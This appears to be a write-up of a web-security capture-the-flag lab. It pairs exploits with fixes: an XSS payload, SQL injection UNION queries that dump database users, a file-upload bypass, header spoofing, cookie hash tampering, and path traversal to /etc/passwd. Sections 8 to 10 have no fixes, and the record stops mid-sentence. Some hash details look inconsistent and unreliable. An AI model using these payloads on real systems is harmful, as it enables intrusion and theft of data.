# Exploits and Fixes

## 1. Hidden Email Exploit

### Exploit
By inspecting the HTML code of the password recovery page, we can see a hidden email field:

```html
<form action="#" method="POST">
    <input type="hidden" name="mail" value="webmaster@borntosec.com" maxlength="15">
    <input type="submit" name="Submit" value= "Submit">
</form>
```

Changing the value of this hidden input allows unauthorized email changes and retrieval of sensitive information.

**Flag:** `d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0`

### Fix
- Remove hidden fields for sensitive data.
- Use session-based authentication.
- Validate server-side email recovery requests.

---

## 2. XSS via Feedback Form

### Exploit
Injecting a script in an input field triggers an alert:

```html
<svg onload=alert(1)>test
```

**Flag:** `0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e`

### Fix
- Escape user input using libraries like `htmlspecialchars()`.
- Implement Content Security Policy (CSP).
- Sanitize input before rendering.

---

## 3. File Upload Bypass

### Exploit
Altering the `multipart/form-data` header allows unauthorized file uploads:

```bash
curl -X POST -H "multipart/form-data" -F "uploaded=@./test.jpeg" -F "Upload=Upload" "http://172.19.71.187/?page=upload;type=image/jpeg" | grep flag
```

**Flag:** `46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8`

### Fix
- Restrict file types and validate MIME types.
- Store uploads outside the web root.
- Scan uploaded files for malware.

---

## 4. HTTP Header Manipulation

### Exploit
Bypassing security checks using `Referer` and `User-Agent` headers:

```bash
curl -H "Referer: https://www.nsa.gov/" -H "User-Agent: ft_bornToSec" http://172.19.71.187/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f
```

**Flag:** `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

### Fix
- Avoid security based on headers alone.
- Implement authentication mechanisms.

---

## 5. SQL Injection

### Exploit
Using SQL injection to extract database information:

```sql
1 UNION ALL SELECT NULL,version()-- 
```

Extracting database names:

```sql
1 UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata--
```

Extracting table names:

```sql
1 UNION ALL SELECT NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema=0x4D656D6265725F53716C5F496E6A656374696F6E-- 
```

Extracting sensitive data:

```sql
1 UNION ALL SELECT NULL,concat(Commentaire,countersign) FROM users--
```

Cracking hashed password:

```bash
echo -n fortytwo | shasum -a 256
```

**Flag:** `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

### Fix
- Use prepared statements.
- Sanitize inputs.
- Implement web application firewalls (WAFs).

---

## 6. Image Metadata Extraction

### Exploit
Extracting data from `Member_images.list_images`:

```sql
1 UNION ALL SELECT NULL,concat(url,title,comment) FROM Member_images.list_images--
```

Decoding the MD5 hash:

```bash
echo -n albatroz | shasum -a 256
```

**Flag:** `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

### Fix
- Restrict database queries.
- Hide table structures.
- Implement access control measures.

---

## 7. Cookie Manipulation

### Exploit
Identifying weak hashing in cookies:

```bash
I_am_admin 68934a3e9455fa72420237eb05902327
```

Cracking the MD5 hash:

```bash
68934a3e9455fa72420237eb05902327 : false
```

Changing to `true`:

```bash
b326b5062b2f0e69046810717534cb09
```

**Flag:** `df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3`

### Fix
- Use secure cookie attributes.
- Implement HMAC-based session management.
- Enforce strong encryption algorithms.

---



# 8

### Exploit

when you naviguate to page you found this -> ?page=survey
So test to naviguate to hidden folder en boom 

http://172.19.71.187/?page=../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd

Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0 


# 9 

### Exploit

On the bottom on the page you found a redirect link to facebook instram and twitter

Just try to modify the redirect link with other things
http://172.19.71.187/index.php?page=redirect&site=test  and BOOM the flag

Good Job Here is the flag : b9e775a0291fed784a2d9680fcfad7edd6b8cdf87648da647aaf4bba288bcab3


# 10

### Exploit

When you visite the robot.txt
you shot that ->
http://172.19.71.187/robots.txt

User-agent: *
Disallow: /whatever
Disallow: /.hidden

so let's check what is inside 










